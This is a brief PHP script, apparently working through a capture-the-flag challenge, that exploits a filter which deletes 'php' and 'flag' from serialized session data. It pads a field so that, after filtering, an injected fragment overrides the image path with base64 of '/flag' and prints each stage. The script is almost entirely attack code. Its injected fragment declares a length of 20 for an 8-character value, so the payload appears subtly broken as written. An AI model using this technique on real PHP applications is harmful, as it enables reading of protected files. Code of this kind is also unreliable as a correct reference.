<?php
// Analyze the escape more carefully

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}

// We need 16 'flag's + 3 'php's = 73 bytes of overflow

$_SESSION = [];
$_SESSION['user'] = str_repeat('flag', 16) . str_repeat('php', 3) . '";s:3:"img";s:20:"L2ZsYWc=";}';
$_SESSION['function'] = 'show_image';
$_SESSION['img'] = base64_encode('guest_img.png');

$serialized = serialize($_SESSION);
echo "Serialized:\n";
echo $serialized . "\n\n";

$filtered = filter($serialized);
echo "Filtered:\n";
echo $filtered . "\n\n";

$result = @unserialize($filtered);
echo "Unserialized:\n";
var_dump($result);

// Let me also try with the injection that closes the array
$_SESSION = [];
$_SESSION['user'] = str_repeat('flag', 16) . str_repeat('php', 3) . '";s:3:"img";s:20:"L2ZsYWc=";}}';
$_SESSION['function'] = 'show_image';
$_SESSION['img'] = base64_encode('guest_img.png');

$serialized = serialize($_SESSION);
echo "\n\n=== With extra } ===\n";
echo "Serialized:\n";
echo $serialized . "\n\n";

$filtered = filter($serialized);
echo "Filtered:\n";
echo $filtered . "\n\n";

$result = @unserialize($filtered);
echo "Unserialized:\n";
var_dump($result);

